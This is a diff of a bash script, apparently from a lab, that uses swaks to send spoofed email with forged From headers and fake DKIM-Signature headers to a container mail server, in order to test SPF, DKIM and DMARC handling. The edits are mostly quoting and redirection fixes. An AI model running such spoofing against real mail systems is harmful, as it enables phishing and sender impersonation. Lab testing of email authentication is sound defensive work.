@@ -10,11 +10,7 @@
 # IP addresses from the containers
 ATTACKER_IP="10.9.0.7"
 MAIL_SERVER_IP="10.9.0.6" # aka VICTIM
-VICTIM_DOMAIN="10.9.0.5"  # DNS
-
-# These are cvariables with the output file names
-EMAIL_FILE="attack-${attack_mode//-}.log"
-NETWORK_FILE="network-att-${attack_mode//-}.log"
+DNS_SERVER_IP="10.9.0.5"  # DNS
 
 # check if the number of args is correct
 if [ $# -eq 2 ] && [ "$1" == "--help" ]; then
@@ -30,41 +26,45 @@ target=$3
 message=$4
 sender_fake=$5
 
+# These are cvariables with the output file names
+EMAIL_FILE="attack-${attack_mode}.log"
+
 send_email() {
 
 local mode=$1
 
 if [ "$mode" = "spf" ]; then
-    swaks --from $sender --to $target \
-  --server $MAIL_SERVER_IP --port 25 \
-  --header "From: ${sender_fake}" \
-  --header "To: ${target}" \
-  --helo attacker.attacker.test \
-  --header "Subject: SPF Test" \
-  --body "$message" \
-  --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
+  swaks --from "$sender" --to "$target" \
+    --server "$MAIL_SERVER_IP" --port 25 \
+    --header "From: ${sender_fake}" \
+    --header "To: ${target}" \
+    --helo mail.attacker.test \
+    --header "Subject: SPF Test" \
+    --body "$message" \
+    --raw 2>/dev/null | tee "$EMAIL_FILE"
 
 elif [ "$mode" = "dkim" ]; then
   swaks --from "$sender" --to "$target" \
     --server "$MAIL_SERVER_IP" --port 25 \
     --header "From: $sender_fake" \
     --header "To: $target" \
-    --helo attacker.attacker.test \
+    --helo mail.attacker.test \
     --header "Subject: DKIM Test" \
     --body "$message" \
-    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=selector; h=from:to:subject; bh=invalidhash; b=invaliddata" \
-    --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
+    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=mail; h=from:to:subject; bh=invalidhash; b=invaliddata" \
+    --raw 2>/dev/null | tee "$EMAIL_FILE"
     
 elif [ "$mode" = "dmarc" ]; then
   swaks --from "$sender" --to "$target" \
     --server "$MAIL_SERVER_IP" --port 25 \
     --header "From: $sender_fake" \
     --header "To: $target" \
-    --helo attacker.attacker.test \
+    --helo mail.attacker.test \
     --header "Subject: DMARC Test" \
     --body "$message" \
-    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=selector; h=from:to:subject; bh=bad; b=bad" \
-    --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
+    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=mail; h=from:to:subject; bh=bad; b=bad" \
+    --raw 2>/dev/null | tee "$EMAIL_FILE"
+
 
 else
   echo
@@ -81,7 +81,7 @@ print_logs() {
   echo ""
   echo ""
   echo "Email Headers"
-  cat -n "$EMAIL_FILE" | grep -i -A3 -B1 'MAIL FROM| RCPT'
+  cat -n "$EMAIL_FILE" | grep -E -i -A3 -B1 'MAIL FROM|RCPT'
 }
 
 help() {
